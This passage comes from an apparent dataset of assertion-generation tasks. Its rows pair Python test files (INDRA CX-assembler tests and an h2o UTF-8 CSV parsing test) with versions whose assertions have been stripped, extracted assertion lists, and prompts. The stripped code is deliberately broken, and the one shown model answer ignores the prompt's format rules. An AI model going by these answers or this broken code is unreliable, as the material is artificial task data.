    cxa.add_statements([st_phos, st_dephos])
    cxa.make_model()
    assert len(cxa.cx['edgeAttributes']) == 14


def test_cited():
    cxa = CxAssembler()
    cxa.add_statements([st_cited])
    cxa.make_model()
    assert len(cxa.cx['citations']) == 1
    assert len(cxa.cx['edgeCitations']) == 1
    citation = cxa.cx['citations'][0]
    assert citation.get('dc:identifier') == 'pmid:12345'
    cid = citation.get('@id')
    assert cxa.cx['edgeCitations'][0]['citations'][0] == cid
    print(cxa.print_cx())


def test_invalid_cited():
    cxa = CxAssembler()
    cxa.add_statements([st_invalid_cited])
    cxa.make_model()
    assert not cxa.cx['citations']
    assert not cxa.cx['edgeCitations']


def test_supports():
    cxa = CxAssembler()
    cxa.add_statements([st_cited])
    cxa.make_model()
    assert len(cxa.cx['supports']) == 1
    assert len(cxa.cx['edgeSupports']) == 1


def test_set_context():
    cxa = CxAssembler()
    cxa.add_statements([st_phos, st_dephos])
    cxa.make_model()
    cxa.set_context('BT20_BREAST')
    print(cxa.cx['nodeAttributes'])
    assert len(cxa.cx['nodeAttributes']) == 11


def test_make_print_model():
    cxa = CxAssembler()
    cxa.add_statements([st_phos])
    cx_str = cxa.make_model()
    assert cx_str


def test_no_pmid():
    cxa = CxAssembler([st_not_cited])
    cxa.make_model()
    assert not cxa.cx['edgeCitations']


def test_hub_layout():
    stmts = [st_phos, st_dephos, st_act]
    cxa = CxAssembler(stmts)
    cxa.make_model()
    graph = hub_layout.cx_to_networkx(cxa.cx)
    erk = hub_layout.get_node_by_name(graph, 'MAPK1')
    hub_layout.add_semantic_hub_layout(cxa.cx, 'MAPK1')
    assert cxa.cx['cartesianLayout']
    for node in cxa.cx['cartesianLayout']:
        if node['node'] == erk:
            assert node['x'] == 0.0
            assert node['y'] == 0.0
        else:
            assert node['x'] != 0
            assert node['y'] != 0

    node_classes = hub_layout.classify_nodes(graph, erk)
    assert node_classes[hub_layout.get_node_by_name(graph, 'DUSP4')] == \
        (1, 'modification', 'other')
    assert node_classes[hub_layout.get_node_by_name(graph, 'MAP2K1')] in \
        {(1, 'activity', 'protein'), (1, 'modification', 'protein')}
","
1from indra.statements import *
2from indra.assemblers.cx import CxAssembler, NiceCxAssembler, hub_layout
3
4mek = Agent('MAP2K1', db_refs={'HGNC': '6840'})
5erk = Agent('MAPK1', db_refs={'UP': 'P28482'})
6dusp = Agent('DUSP4')
7st_phos = Phosphorylation(mek, erk)
8st_dephos = Dephosphorylation(dusp, erk)
9st_complex = Complex([mek, erk, dusp])
10st_complex2 = Complex([mek, mek, erk, erk, dusp])
11st_act = Activation(mek, erk)
12st_gef = Gef(Agent('SOS1'), Agent('HRAS'))
13st_gap = Gap(Agent('RASA1'), Agent('HRAS'))
14st_act2 = Inhibition(dusp, erk)
15st_not_cited = Phosphorylation(mek, erk, evidence=[Evidence()])
16st_cited = Phosphorylation(mek, erk, evidence=[Evidence(pmid='12345',
17                                              text='MEK phosphorylates ERK')])
18st_invalid_cited = Phosphorylation(mek, erk, evidence=[Evidence(pmid='api35',
19                                              text='MEK phosphorylates ERK')])
20
21
22def test_phos():
23    cxa = CxAssembler()
24    cxa.add_statements([st_phos])
25    cxa.make_model()
26
27
28def test_phos_nice():
29    cxa = NiceCxAssembler([st_cited])
30    cxa.make_model()
31    print(cxa.print_model())
32
33
34def test_gapgef_nice():
35    cxa = NiceCxAssembler([st_gef, st_gap])
36    cxa.make_model()
37    print(cxa.print_model())
38
39
40def test_dephos():
41    cxa = CxAssembler()
42    cxa.add_statements([st_phos, st_dephos])
43    cxa.make_model()
44
45
46def test_complex():
47    cxa = CxAssembler()
48    cxa.add_statements([st_complex])
49    cxa.make_model()
50
51
52def test_complex2():
53    cxa = CxAssembler()
54    cxa.add_statements([st_complex2])
55    cxa.make_model()
56
57
58def test_act():
59    cxa = CxAssembler()
60    cxa.add_statements([st_act, st_act2])
61    cxa.make_model()
62
63
64def test_gef():
65    cxa = CxAssembler()
66    cxa.add_statements([st_gef])
67    cxa.make_model()
68
69
70def test_gap():
71    cxa = CxAssembler()
72    cxa.add_statements([st_gap])
73    cxa.make_model()
74
75
76def test_node_attributes():
77    cxa = CxAssembler()
78    cxa.add_statements([st_phos, st_dephos])
79    cxa.make_model()
80
81
82def test_edge_attributes():
83    cxa = CxAssembler()
84    cxa.add_statements([st_phos, st_dephos])
85    cxa.make_model()
86
87
88def test_cited():
89    cxa = CxAssembler()
90    cxa.add_statements([st_cited])
91    cxa.make_model()
92    citation = cxa.cx['citations'][0]
93    cid = citation.get('@id')
94    print(cxa.print_cx())
95
96
97def test_invalid_cited():
98    cxa = CxAssembler()
99    cxa.add_statements([st_invalid_cited])
100    cxa.make_model()
101
102
103def test_supports():
104    cxa = CxAssembler()
105    cxa.add_statements([st_cited])
106    cxa.make_model()
107
108
109def test_set_context():
110    cxa = CxAssembler()
111    cxa.add_statements([st_phos, st_dephos])
112    cxa.make_model()
113    cxa.set_context('BT20_BREAST')
114    print(cxa.cx['nodeAttributes'])
115
116
117def test_make_print_model():
118    cxa = CxAssembler()
119    cxa.add_statements([st_phos])
120    cx_str = cxa.make_model()
121
122
123def test_no_pmid():
124    cxa = CxAssembler([st_not_cited])
125    cxa.make_model()
126
127
128def test_hub_layout():
129    stmts = [st_phos, st_dephos, st_act]
130    cxa = CxAssembler(stmts)
131    cxa.make_model()
132    graph = hub_layout.cx_to_networkx(cxa.cx)
133    erk = hub_layout.get_node_by_name(graph, 'MAPK1')
134    hub_layout.add_semantic_hub_layout(cxa.cx, 'MAPK1')
135    for node in cxa.cx['cartesianLayout']:
136        if node['node'] == erk:
137        else:
138
139    node_classes = hub_layout.classify_nodes(graph, erk)
140        (1, 'modification', 'other')
141        {(1, 'activity', 'protein'), (1, 'modification', 'protein')}
142","[[""len(cxa.cx['nodes'])"", '==', '2'], [""len(cxa.cx['edges'])"", '==', '1'], ['len(cxa.network.nodes)', '==', '2'], ['len(cxa.network.edges)', '==', '1'], ['len(cxa.network.nodes)', '==', '3'], ['len(cxa.network.edges)', '==', '2'], [""len(cxa.cx['nodes'])"", '==', '3'], [""len(cxa.cx['edges'])"", '==', '2'], [""len(cxa.cx['nodes'])"", '==', '3'], [""len(cxa.cx['edges'])"", '==', '3'], [""len(cxa.cx['nodes'])"", '==', '3'], [""len(cxa.cx['edges'])"", '==', '5'], [""len(cxa.cx['nodes'])"", '==', '3'], [""len(cxa.cx['edges'])"", '==', '2'], [""len(cxa.cx['nodes'])"", '==', '2'], [""len(cxa.cx['edges'])"", '==', '1'], [""len(cxa.cx['nodes'])"", '==', '2'], [""len(cxa.cx['edges'])"", '==', '1'], [""len(cxa.cx['nodeAttributes'])"", '==', '5'], [""len(cxa.cx['edgeAttributes'])"", '==', '14'], [""len(cxa.cx['citations'])"", '==', '1'], [""len(cxa.cx['edgeCitations'])"", '==', '1'], [""citation.get('dc:identifier')"", '==', ""'pmid:12345'""], [""cxa.cx['edgeCitations'][0]['citations'][0]"", '==', 'cid'], [""cxa.cx['citations']"", '==', 'False'], [""cxa.cx['edgeCitations']"", '==', 'False'], [""len(cxa.cx['supports'])"", '==', '1'], [""len(cxa.cx['edgeSupports'])"", '==', '1'], [""len(cxa.cx['nodeAttributes'])"", '==', '11'], ['cx_str', '==', 'True'], [""cxa.cx['edgeCitations']"", '==', 'False'], [""cxa.cx['cartesianLayout']"", '==', 'True'], [""node['x']"", '==', '0.0'], [""node['y']"", '==', '0.0'], [""node['x']"", '!=', '0'], [""node['y']"", '!=', '0'], ['node_classes[hub_layout.get_node_by_name(graph', '==', 'True']]",38,37,0.9736842105263158,0.0074029611844737,"['mek', 'erk', 'dusp', 'st_phos', 'st_dephos', 'st_complex', 'st_complex2', 'st_act', 'st_gef', 'st_gap', 'st_act2', 'st_not_cited', 'st_cited', 'st_invalid_cited', 'cxa', 'citation', 'cid', 'cx_str', 'stmts', 'graph', 'node_classes']",21,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['mek', 'erk', 'dusp', 'st_phos', 'st_dephos', 'st_complex', 'st_complex2', 'st_act', 'st_gef', 'st_gap', 'st_act2', 'st_not_cited', 'st_cited', 'st_invalid_cited', 'cxa', 'citation', 'cid', 'cx_str', 'stmts', 'graph', 'node_classes']
*Code:

1from indra.statements import *
2from indra.assemblers.cx import CxAssembler, NiceCxAssembler, hub_layout
3
4mek = Agent('MAP2K1', db_refs={'HGNC': '6840'})
5erk = Agent('MAPK1', db_refs={'UP': 'P28482'})
6dusp = Agent('DUSP4')
7st_phos = Phosphorylation(mek, erk)
8st_dephos = Dephosphorylation(dusp, erk)
9st_complex = Complex([mek, erk, dusp])
10st_complex2 = Complex([mek, mek, erk, erk, dusp])
11st_act = Activation(mek, erk)
12st_gef = Gef(Agent('SOS1'), Agent('HRAS'))
13st_gap = Gap(Agent('RASA1'), Agent('HRAS'))
14st_act2 = Inhibition(dusp, erk)
15st_not_cited = Phosphorylation(mek, erk, evidence=[Evidence()])
16st_cited = Phosphorylation(mek, erk, evidence=[Evidence(pmid='12345',
17                                              text='MEK phosphorylates ERK')])
18st_invalid_cited = Phosphorylation(mek, erk, evidence=[Evidence(pmid='api35',
19                                              text='MEK phosphorylates ERK')])
20
21
22def test_phos():
23    cxa = CxAssembler()
24    cxa.add_statements([st_phos])
25    cxa.make_model()
26
27
28def test_phos_nice():
29    cxa = NiceCxAssembler([st_cited])
30    cxa.make_model()
31    print(cxa.print_model())
32
33
34def test_gapgef_nice():
35    cxa = NiceCxAssembler([st_gef, st_gap])
36    cxa.make_model()
37    print(cxa.print_model())
38
39
40def test_dephos():
41    cxa = CxAssembler()
42    cxa.add_statements([st_phos, st_dephos])
43    cxa.make_model()
44
45
46def test_complex():
47    cxa = CxAssembler()
48    cxa.add_statements([st_complex])
49    cxa.make_model()
50
51
52def test_complex2():
53    cxa = CxAssembler()
54    cxa.add_statements([st_complex2])
55    cxa.make_model()
56
57
58def test_act():
59    cxa = CxAssembler()
60    cxa.add_statements([st_act, st_act2])
61    cxa.make_model()
62
63
64def test_gef():
65    cxa = CxAssembler()
66    cxa.add_statements([st_gef])
67    cxa.make_model()
68
69
70def test_gap():
71    cxa = CxAssembler()
72    cxa.add_statements([st_gap])
73    cxa.make_model()
74
75
76def test_node_attributes():
77    cxa = CxAssembler()
78    cxa.add_statements([st_phos, st_dephos])
79    cxa.make_model()
80
81
82def test_edge_attributes():
83    cxa = CxAssembler()
84    cxa.add_statements([st_phos, st_dephos])
85    cxa.make_model()
86
87
88def test_cited():
89    cxa = CxAssembler()
90    cxa.add_statements([st_cited])
91    cxa.make_model()
92    citation = cxa.cx['citations'][0]
93    cid = citation.get('@id')
94    print(cxa.print_cx())
95
96
97def test_invalid_cited():
98    cxa = CxAssembler()
99    cxa.add_statements([st_invalid_cited])
100    cxa.make_model()
101
102
103def test_supports():
104    cxa = CxAssembler()
105    cxa.add_statements([st_cited])
106    cxa.make_model()
107
108
109def test_set_context():
110    cxa = CxAssembler()
111    cxa.add_statements([st_phos, st_dephos])
112    cxa.make_model()
113    cxa.set_context('BT20_BREAST')
114    print(cxa.cx['nodeAttributes'])
115
116
117def test_make_print_model():
118    cxa = CxAssembler()
119    cxa.add_statements([st_phos])
120    cx_str = cxa.make_model()
121
122
123def test_no_pmid():
124    cxa = CxAssembler([st_not_cited])
125    cxa.make_model()
126
127
128def test_hub_layout():
129    stmts = [st_phos, st_dephos, st_act]
130    cxa = CxAssembler(stmts)
131    cxa.make_model()
132    graph = hub_layout.cx_to_networkx(cxa.cx)
133    erk = hub_layout.get_node_by_name(graph, 'MAPK1')
134    hub_layout.add_semantic_hub_layout(cxa.cx, 'MAPK1')
135    for node in cxa.cx['cartesianLayout']:
136        if node['node'] == erk:
137        else:
138
139    node_classes = hub_layout.classify_nodes(graph, erk)
140        (1, 'modification', 'other')
141        {(1, 'activity', 'protein'), (1, 'modification', 'protein')}
142",5353,"[22, 'st_phos', '!=', None, ""st_phos should not be None""],
[28, 'st_cited', '!=', None, ""st_cited should not be None""],
[34, 'st_gef', '!=', None, ""st_gef should not be None""],
[34, 'st_gap', '!=', None, ""st_gap should not be None""],
[40, 'st_phos', '!=', None, ""st_phos should not be None""],
[40, 'st_dephos', '!=', None, ""st_dephos should not be None""],
[46, 'st_complex', '!=', None, ""st_complex should not be None""],
[52, 'st_complex2', '!=', None, ""st_complex2 should not be None""],
[58, 'st_act', '!=', None, ""st_act should not be None""],
[58, 'st_act2', '!=', None, ""st_act2 should not be None""],
[64, 'st_gef', '!=', None, ""st_gef should not be None""],
[70, 'st_gap', '!=', None, ""st_gap should not be None""],
[76, 'st_phos', '!=', None, ""st_phos should not be None""],
[76, 'st_dephos', '!=', None, ""st_dephos should not be None""],
[82, 'st_phos', '!=', None, ""st_phos should not be None""],
[82, 'st_dephos', '!=', None, ""st_dephos should not be None""],
[88, 'st_cited', '!=', None, ""st_cited should not be None""],
[97, 'st_invalid_cited', '!=', None, ""st_invalid_cited should not be None""],
[104, 'st_cited', '!=', None, ""st_cited should not be None""],
[117, 'st_phos', '!=', None, ""st_phos should not be None""],
[124, 'st_not_cited', '!=', None, ""st_not_cited should not be None""],
[129, 'st_phos', '!=', None, ""st_phos should not be None""],
[129, 'st_dephos', '!=', None, ""st_dephos should not be None""],
[129, 'st_act', '!=', None, ""st_act should not be None""]"
pchmieli/h2o-3,"import unittest, random, sys, time, os
sys.path.extend(['.','..','../..','py'])

import h2o2 as h2o
import h2o_cmd, h2o_import as h2i
import codecs
from h2o_test import dump_json

print ""apparently need to have at least one normal character otherwise the parse doesn't work right""
print ""just doing single char here""

# semicolon ..h2o apparently can auto-detect as separator. so don't use it.
# https://0xdata.atlassian.net/browse/HEX-1951
# ordinalChoices = range(0x0, 0x80) # doesn't include last value ..allow 7f
# ordinalChoices = range(0x0, 0x100) # doesn't include last value ..allow 7f
# ordinalChoices = range(0x0, 0x80) # doesn't include last value ..allow 7f
# ordinalChoices = range(0x20, 0x100) # doesn't include last value ..allow 7f
ordinalChoices = range(0x1e, 0x100) # doesn't include last value ..allow 7f
# 1d and below fails? unable to decode json (in domains list)

# Ben's test shows other failures
# http://www.bennadel.com/blog/2576-testing-which-ascii-characters-break-json-javascript-object-notation-parsing.htm

# ordinalChoices.remove(0x00) # nul This causes problems. other jira
# ordinalChoices.remove(0x01) # hiveseparator. don't want it autodetecting the hive separator
# ordinalChoices.remove(0x09) # HT (horizontal tab) causes NA?
# ordinalChoices.remove(0x0a) # lf
# ordinalChoices.remove(0x0d) # cr

# white space (tab and space) will throw the col count off?. I guess they cause na 
# (since we're just doing single char here)
ordinalChoices.remove(0x20) # space

ordinalChoices.remove(0x22) # double quote
# ordinalChoices.remove(0x27) # apostrophe. should be legal if single quotes not enabled
ordinalChoices.remove(0x2c) # comma. don't put extra commas in

# have to exclude numbers, otherwise the mix of ints and enums will flip things to NA
ordinalChoices.remove(0x30) # 0
ordinalChoices.remove(0x31) # 1
ordinalChoices.remove(0x32) # 2
ordinalChoices.remove(0x33) # 3
ordinalChoices.remove(0x34) # 4
ordinalChoices.remove(0x35) # 5
ordinalChoices.remove(0x36) # 6
ordinalChoices.remove(0x37) # 7
ordinalChoices.remove(0x38) # 8
ordinalChoices.remove(0x39) # 9
#ordinalChoices.remove(0x3b) # semicolon Why is this a problem

# print ordinalChoices

def generate_random_utf8_string(length=1, multi=False, row=0, col=0):
    # want to handle more than 256 numbers
    cList = []
    for i in range(length):
        r = random.choice(ordinalChoicesMulti if multi else ordinalChoices)
        if (row==1 and col==1 and i==0):
            while (r==0x40 or r==0x23): # @ is 0x40, # is 0x23
                # rechoose
                r = random.choice(ordinalChoicesMulti if multi else ordinalChoices)
        # ToDo: Shouldn't encode it here. Then we wouldn't have to decode it to unicode before writing.
        # c = unichr(r).encode('utf-8')
        # fine for it to be unicode obj when we use the result below
        cList.append(unichr(r))
    return """".join(cList)

def write_syn_dataset(csvPathname, rowCount, colCount, colSepChar="","", rowSepChar=""\n"", SEED=12345678):
    r1 = random.Random(SEED)
    dsf = codecs.open(csvPathname, encoding='utf-8', mode='w+')
    for i in range(rowCount):
        rowData = []
        for j in range(colCount):
            r = generate_random_utf8_string(length=2, row=i, col=j)
            rowData.append(r)
        rowDataCsv = colSepChar.join(rowData)
        dsf.write(rowDataCsv + rowSepChar)
    dsf.close()

class Basic(unittest.TestCase):
    def tearDown(self):
        h2o.check_sandbox_for_errors()

    @classmethod
    def setUpClass(cls):
        global SEED
        print ""Temporarily forcing seed to known case that causes assert""
        SEED = h2o.setup_random_seed(seed=1364157389021990032)
        h2o.init(2,java_heap_GB=1,use_flatfile=True)

    @classmethod
    def tearDownClass(cls):
        h2o.tear_down_cloud()

    def test_parse_rand_utf8(self):
        SYNDATASETS_DIR = h2o.make_syn_dir()
        print ""HACK: reduce rows to 10 for debug""
        tryList = [
            # do two cols to detect bad eol behavior
            (10, 2, 'cA', 120),
            (10, 2, 'cG', 120),
            (10, 2, 'cH', 120),
            ]

        print ""What about messages to log (INFO) about unmatched quotes (before eol)""
        # got this ..trying to avoid for now
        # Exception: rjson error in parse: Argument 'source_key' error: Parser setup appears to be broken, got AUTO

        for (rowCount, colCount, hex_key, timeoutSecs) in tryList:
            SEEDPERFILE = random.randint(0, sys.maxint)
            csvFilename = 'syn_' + str(SEEDPERFILE) + ""_"" + str(rowCount) + 'x' + str(colCount) + '.csv'
            csvPathname = SYNDATASETS_DIR + '/' + csvFilename

            print ""\nCreating random"", csvPathname
            write_syn_dataset(csvPathname, rowCount, colCount, SEED=SEEDPERFILE)
            parseResult = h2i.import_parse(path=csvPathname, schema='put', check_header=0,
                hex_key=hex_key, timeoutSecs=timeoutSecs, doSummary=False)
            print ""parseResult:"", dump_json(parseResult)

            numRows, numCols, parse_key = h2o_cmd.infoFromParse(parseResult)
            inspect = h2o_cmd.runInspect(key=parse_key)
            missingList, labelList, numRows, numCols = h2o_cmd.infoFromInspect(inspect)

            assert len(missingList) == 0
            # FIX! check type?
        
            # print ""inspect:"", h2o.dump_json(inspect)
            self.assertEqual(numRows, rowCount, msg='Wrong numRows: %s %s' % (numRows, rowCount))
            self.assertEqual(numCols, colCount, msg='Wrong numCols: %s %s' % (numCols, colCount))

if __name__ == '__main__':
    h2o.unit_main()
","
1import unittest, random, sys, time, os
2sys.path.extend(['.','..','../..','py'])
3
4import h2o2 as h2o
5import h2o_cmd, h2o_import as h2i
6import codecs
7from h2o_test import dump_json
8
9print ""apparently need to have at least one normal character otherwise the parse doesn't work right""
10print ""just doing single char here""
11
12# semicolon ..h2o apparently can auto-detect as separator. so don't use it.
13# https://0xdata.atlassian.net/browse/HEX-1951
14# ordinalChoices = range(0x0, 0x80) # doesn't include last value ..allow 7f
15# ordinalChoices = range(0x0, 0x100) # doesn't include last value ..allow 7f
16# ordinalChoices = range(0x0, 0x80) # doesn't include last value ..allow 7f
17# ordinalChoices = range(0x20, 0x100) # doesn't include last value ..allow 7f
18ordinalChoices = range(0x1e, 0x100) # doesn't include last value ..allow 7f
19# 1d and below fails? unable to decode json (in domains list)
20
21# Ben's test shows other failures
22# http://www.bennadel.com/blog/2576-testing-which-ascii-characters-break-json-javascript-object-notation-parsing.htm
23
24# ordinalChoices.remove(0x00) # nul This causes problems. other jira
25# ordinalChoices.remove(0x01) # hiveseparator. don't want it autodetecting the hive separator
26# ordinalChoices.remove(0x09) # HT (horizontal tab) causes NA?
27# ordinalChoices.remove(0x0a) # lf
28# ordinalChoices.remove(0x0d) # cr
29
30# white space (tab and space) will throw the col count off?. I guess they cause na 
31# (since we're just doing single char here)
32ordinalChoices.remove(0x20) # space
33
34ordinalChoices.remove(0x22) # double quote
35# ordinalChoices.remove(0x27) # apostrophe. should be legal if single quotes not enabled
36ordinalChoices.remove(0x2c) # comma. don't put extra commas in
37
38# have to exclude numbers, otherwise the mix of ints and enums will flip things to NA
39ordinalChoices.remove(0x30) # 0
40ordinalChoices.remove(0x31) # 1
41ordinalChoices.remove(0x32) # 2
42ordinalChoices.remove(0x33) # 3
43ordinalChoices.remove(0x34) # 4
44ordinalChoices.remove(0x35) # 5
45ordinalChoices.remove(0x36) # 6
46ordinalChoices.remove(0x37) # 7
47ordinalChoices.remove(0x38) # 8
48ordinalChoices.remove(0x39) # 9
49#ordinalChoices.remove(0x3b) # semicolon Why is this a problem
50
51# print ordinalChoices
52
53def generate_random_utf8_string(length=1, multi=False, row=0, col=0):
54    # want to handle more than 256 numbers
55    cList = []
56    for i in range(length):
57        r = random.choice(ordinalChoicesMulti if multi else ordinalChoices)
58        if (row==1 and col==1 and i==0):
59            while (r==0x40 or r==0x23): # @ is 0x40, # is 0x23
60                # rechoose
61                r = random.choice(ordinalChoicesMulti if multi else ordinalChoices)
62        # ToDo: Shouldn't encode it here. Then we wouldn't have to decode it to unicode before writing.
63        # c = unichr(r).encode('utf-8')
64        # fine for it to be unicode obj when we use the result below
65        cList.append(unichr(r))
66    return """".join(cList)
67
68def write_syn_dataset(csvPathname, rowCount, colCount, colSepChar="","", rowSepChar=""\n"", SEED=12345678):
69    r1 = random.Random(SEED)
70    dsf = codecs.open(csvPathname, encoding='utf-8', mode='w+')
71    for i in range(rowCount):
72        rowData = []
73        for j in range(colCount):
74            r = generate_random_utf8_string(length=2, row=i, col=j)
75            rowData.append(r)
76        rowDataCsv = colSepChar.join(rowData)
77        dsf.write(rowDataCsv + rowSepChar)
78    dsf.close()
79
80class Basic(unittest.TestCase):
81    def tearDown(self):
82        h2o.check_sandbox_for_errors()
83
84    @classmethod
85    def setUpClass(cls):
86        global SEED
87        SEED = h2o.setup_random_seed(seed=1364157389021990032)
88        h2o.init(2,java_heap_GB=1,use_flatfile=True)
89
90    @classmethod
91    def tearDownClass(cls):
92        h2o.tear_down_cloud()
93
94    def test_parse_rand_utf8(self):
95        SYNDATASETS_DIR = h2o.make_syn_dir()
96        print ""HACK: reduce rows to 10 for debug""
97        tryList = [
98            # do two cols to detect bad eol behavior
99            (10, 2, 'cA', 120),
100            (10, 2, 'cG', 120),
101            (10, 2, 'cH', 120),
102            ]
103
104        print ""What about messages to log (INFO) about unmatched quotes (before eol)""
105        # got this ..trying to avoid for now
106        # Exception: rjson error in parse: Argument 'source_key' error: Parser setup appears to be broken, got AUTO
107
108        for (rowCount, colCount, hex_key, timeoutSecs) in tryList:
109            SEEDPERFILE = random.randint(0, sys.maxint)
110            csvFilename = 'syn_' + str(SEEDPERFILE) + ""_"" + str(rowCount) + 'x' + str(colCount) + '.csv'
111            csvPathname = SYNDATASETS_DIR + '/' + csvFilename
112
113            print ""\nCreating random"", csvPathname
114            write_syn_dataset(csvPathname, rowCount, colCount, SEED=SEEDPERFILE)
115            parseResult = h2i.import_parse(path=csvPathname, schema='put', check_header=0,
116                hex_key=hex_key, timeoutSecs=timeoutSecs, doSummary=False)
117            print ""parseResult:"", dump_json(parseResult)
118
119            numRows, numCols, parse_key = h2o_cmd.infoFromParse(parseResult)
120            inspect = h2o_cmd.runInspect(key=parse_key)
121            missingList, labelList, numRows, numCols = h2o_cmd.infoFromInspect(inspect)
122
123            # FIX! check type?
124        
125            # print ""inspect:"", h2o.dump_json(inspect)
126
127if __name__ == '__main__':
128    h2o.unit_main()
129","[['len(missingList)', '==', '0']]",4,1,0.25,0.0001775252973548,"['# ordinalChoices', 'ordinalChoices', 'length', 'multi', 'row', 'col', 'cList', 'r', '# c', 'csvPathname', 'rowCount', 'colCount', 'colSepChar', '""', 'rowSepChar', 'SEED', 'r1', 'dsf', 'rowData', 'rowDataCsv', 'cls', 'SYNDATASETS_DIR', 'tryList', 'SEEDPERFILE', 'csvFilename', 'parseResult', 'numRows', 'numCols', 'parse_key', 'inspect', 'missingList', 'labelList']",32,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['# ordinalChoices', 'ordinalChoices', 'length', 'multi', 'row', 'col', 'cList', 'r', '# c', 'csvPathname', 'rowCount', 'colCount', 'colSepChar', '""', 'rowSepChar', 'SEED', 'r1', 'dsf', 'rowData', 'rowDataCsv', 'cls', 'SYNDATASETS_DIR', 'tryList', 'SEEDPERFILE', 'csvFilename', 'parseResult', 'numRows', 'numCols', 'parse_key', 'inspect', 'missingList', 'labelList']
*Code:

1import unittest, random, sys, time, os
2sys.path.extend(['.','..','../..','py'])
3
4import h2o2 as h2o
5import h2o_cmd, h2o_import as h2i
6import codecs
7from h2o_test import dump_json
8
9print ""apparently need to have at least one normal character otherwise the parse doesn't work right""
10print ""just doing single char here""
11
12# semicolon ..h2o apparently can auto-detect as separator. so don't use it.
13# https://0xdata.atlassian.net/browse/HEX-1951
14# ordinalChoices = range(0x0, 0x80) # doesn't include last value ..allow 7f
15# ordinalChoices = range(0x0, 0x100) # doesn't include last value ..allow 7f
16# ordinalChoices = range(0x0, 0x80) # doesn't include last value ..allow 7f
17# ordinalChoices = range(0x20, 0x100) # doesn't include last value ..allow 7f
18ordinalChoices = range(0x1e, 0x100) # doesn't include last value ..allow 7f
19# 1d and below fails? unable to decode json (in domains list)
20
21# Ben's test shows other failures
22# http://www.bennadel.com/blog/2576-testing-which-ascii-characters-break-json-javascript-object-notation-parsing.htm
23
24# ordinalChoices.remove(0x00) # nul This causes problems. other jira
25# ordinalChoices.remove(0x01) # hiveseparator. don't want it autodetecting the hive separator
26# ordinalChoices.remove(0x09) # HT (horizontal tab) causes NA?
27# ordinalChoices.remove(0x0a) # lf
28# ordinalChoices.remove(0x0d) # cr
29
30# white space (tab and space) will throw the col count off?. I guess they cause na 
31# (since we're just doing single char here)
32ordinalChoices.remove(0x20) # space
33
34ordinalChoices.remove(0x22) # double quote
35# ordinalChoices.remove(0x27) # apostrophe. should be legal if single quotes not enabled
36ordinalChoices.remove(0x2c) # comma. don't put extra commas in
37
38# have to exclude numbers, otherwise the mix of ints and enums will flip things to NA
39ordinalChoices.remove(0x30) # 0
40ordinalChoices.remove(0x31) # 1
41ordinalChoices.remove(0x32) # 2
42ordinalChoices.remove(0x33) # 3
43ordinalChoices.remove(0x34) # 4
44ordinalChoices.remove(0x35) # 5
45ordinalChoices.remove(0x36) # 6
46ordinalChoices.remove(0x37) # 7
47ordinalChoices.remove(0x38) # 8
48ordinalChoices.remove(0x39) # 9
49#ordinalChoices.remove(0x3b) # semicolon Why is this a problem
50
51# print ordinalChoices
52
53def generate_random_utf8_string(length=1, multi=False, row=0, col=0):
54    # want to handle more than 256 numbers
55    cList = []
56    for i in range(length):
57        r = random.choice(ordinalChoicesMulti if multi else ordinalChoices)
58        if (row==1 and col==1 and i==0):
59            while (r==0x40 or r==0x23): # @ is 0x40, # is 0x23
60                # rechoose
61                r = random.choice(ordinalChoicesMulti if multi else ordinalChoices)
62        # ToDo: Shouldn't encode it here. Then we wouldn't have to decode it to unicode before writing.
63        # c = unichr(r).encode('utf-8')
64        # fine for it to be unicode obj when we use the result below
65        cList.append(unichr(r))
66    return """".join(cList)
67
68def write_syn_dataset(csvPathname, rowCount, colCount, colSepChar="","", rowSepChar=""\n"", SEED=12345678):
69    r1 = random.Random(SEED)
70    dsf = codecs.open(csvPathname, encoding='utf-8', mode='w+')
71    for i in range(rowCount):
72        rowData = []
73        for j in range(colCount):
74            r = generate_random_utf8_string(length=2, row=i, col=j)
75            rowData.append(r)
76        rowDataCsv = colSepChar.join(rowData)
77        dsf.write(rowDataCsv + rowSepChar)
78    dsf.close()
79
80class Basic(unittest.TestCase):
81    def tearDown(self):
82        h2o.check_sandbox_for_errors()
83
84    @classmethod
85    def setUpClass(cls):
86        global SEED
87        SEED = h2o.setup_random_seed(seed=1364157389021990032)
88        h2o.init(2,java_heap_GB=1,use_flatfile=True)
89
90    @classmethod
91    def tearDownClass(cls):
92        h2o.tear_down_cloud()
93
94    def test_parse_rand_utf8(self):
95        SYNDATASETS_DIR = h2o.make_syn_dir()
96        print ""HACK: reduce rows to 10 for debug""
97        tryList = [
98            # do two cols to detect bad eol behavior
